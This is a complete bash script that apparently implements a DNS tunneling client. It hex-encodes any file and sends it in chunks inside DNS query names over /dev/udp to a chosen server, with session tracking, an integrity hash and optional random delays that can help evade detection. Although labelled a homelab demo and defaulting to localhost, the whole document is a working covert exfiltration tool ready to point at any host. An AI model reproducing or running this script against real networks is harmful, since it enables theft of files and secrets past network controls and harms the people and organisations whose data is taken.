#!/usr/bin/env bash
# DNS tunneling client in pure bash (no Python): sends a file as hex-encoded
# chunks in DNS query names via /dev/udp. Needs only bash + coreutils
# (od, sed, tr, awk, sha256sum, basename). Authorized homelab demo use only.
set -u

SERVER=127.0.0.1
PORT=5353
ZONE=tunnel.local
FILE=""
NAME=""
DMIN=0
DMAX=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --server) SERVER=$2; shift 2 ;;
    --port) PORT=$2; shift 2 ;;
    --zone) ZONE=$2; shift 2 ;;
    --file) FILE=$2; shift 2 ;;
    --name) NAME=$2; shift 2 ;;
    --delay-min) DMIN=$2; shift 2 ;;
    --delay-max) DMAX=$2; shift 2 ;;
    *) echo "unknown argument: $1" >&2; exit 1 ;;
  esac
done

if [[ -z $FILE || ! -f $FILE ]]; then
  echo "usage: $0 --file PATH [--server IP] [--port N] [--zone Z] [--name N] [--delay-min S] [--delay-max S]" >&2
  exit 1
fi

CHUNK=31

to_hex() { od -An -v -tx1 | tr -d ' \n'; }

hexdata=$(to_hex < "$FILE")
total=$(( (${#hexdata} / 2 + CHUNK - 1) / CHUNK ))
sess=$(od -An -N4 -v -tx1 /dev/urandom | tr -d ' \n')
sha=$(sha256sum "$FILE" | awk '{print $1}')

if [[ -z $NAME ]]; then NAME=$(basename "$FILE"); fi
NAME=${NAME//[^A-Za-z0-9._-]/_}
NAME=${NAME:0:30}
namehex=$(printf '%s' "$NAME" | to_hex)

send_query() {
  local qname=$1 attempt qid hex l
  for attempt in 1 2 3; do
    qid=$(( ((RANDOM << 15) | RANDOM) & 0xffff ))
    hex=$(printf '%04x01000001000000000000' "$qid")
    local IFS=.
    for l in $qname; do
      hex+=$(printf '%02x' "${#l}")
      hex+=$(printf '%s' "$l" | to_hex)
    done
    hex+=0000010001
    printf "$(printf '%s' "$hex" | sed 's/../\\x&/g')" >&3
    if timeout 1 dd bs=4096 count=1 <&3 2>/dev/null | grep -q .; then
      return 0
    fi
  done
  echo "no response from server for $qname" >&2
  return 1
}

exec 3<>/dev/udp/"$SERVER"/"$PORT"

suffix="up.$ZONE"
send_query "x.$namehex.$(printf '%04x' "$total").$sess.$suffix"
for ((i = 0; i < total; i++)); do
  if awk -v a="$DMAX" -v b="$DMIN" 'BEGIN { exit !(a > b) }'; then
    sleep "$(awk -v mn="$DMIN" -v mx="$DMAX" 'BEGIN { srand(); printf "%.3f", mn + (mx - mn) * rand() }')"
  fi
  send_query "h.${hexdata:i*62:62}.$(printf '%04x' "$i").$sess.$suffix"
done
send_query "e.${sha:0:32}.${sha:32:32}.$sess.$suffix" || exit 1
echo "sent $FILE ($total chunk(s), session $sess)"
